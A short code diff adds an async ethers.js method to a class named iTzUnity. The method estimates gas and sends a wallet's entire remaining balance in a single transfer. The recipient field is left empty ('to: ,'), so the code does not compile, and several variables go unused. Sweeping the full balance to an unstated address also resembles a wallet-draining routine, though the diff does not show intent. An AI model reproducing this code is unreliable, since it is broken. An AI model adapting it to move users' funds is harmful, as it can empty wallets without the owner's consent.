@@ -21,8 +21,34 @@ class iTzUnity {
 		this.token = token;
 	}
 
-	transaction() {
+	async transaction() {
+		let {account, provider, signer, token, transaction} = this;
 
+		const balance = ethers.BigNumber.from(token.balance);
+		// Estimate gas price and gas limit
+		const gasPrice = await provider!.getGasPrice();
+		const gasLimit = ethers.BigNumber.from(21000); // Standard gas limit for a simple ETH transfer
+
+		// Calculate total gas fee
+		const gasFee = gasPrice.mul(gasLimit);
+
+		// Calculate the amount to send (balance - gasFee)
+		const amountToSend = balance.sub(gasFee);
+
+		if (amountToSend.lte(0)) {
+			throw new Error('Insufficient funds to cover the gas fee');
+		}
+
+		// Create the transaction
+		const tx = {
+			to: ,
+			value: amountToSend,
+			gasLimit: gasLimit,
+			gasPrice: gasPrice,
+		};
+
+		// Send the transaction
+		const txResponse = await signer!.sendTransaction(tx);
 	}
 }
 
